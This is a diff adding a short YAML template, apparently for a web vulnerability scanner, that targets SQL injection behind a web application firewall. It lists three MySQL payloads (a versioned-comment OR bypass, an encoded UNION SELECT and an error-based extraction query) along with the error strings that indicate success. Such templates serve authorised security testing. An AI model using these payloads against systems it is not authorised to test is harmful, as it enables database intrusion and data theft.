@@ -1,0 +1,23 @@
+name: custom-sqli-bypass
+description: Custom SQL injection bypass for specific WAF
+author: RyoSec
+severity: critical
+module: sqli-custom
+owasp: "A03:2021 Injection"
+cwe: CWE-89
+payloads:
+  - value: "' /*!50000OR*/ 1=1-- -"
+    variant: mysql-waf-bypass
+  - value: "' %55NION %53ELECT 1,2,3-- -"
+    variant: hex-union
+  - value: "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x716b,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
+    variant: error-based-extract
+    encoding: none
+detection:
+  method: contains
+  patterns:
+    - "syntax error"
+    - "mysql"
+    - "warning"
+    - "Duplicate entry"
+    - "SQL"
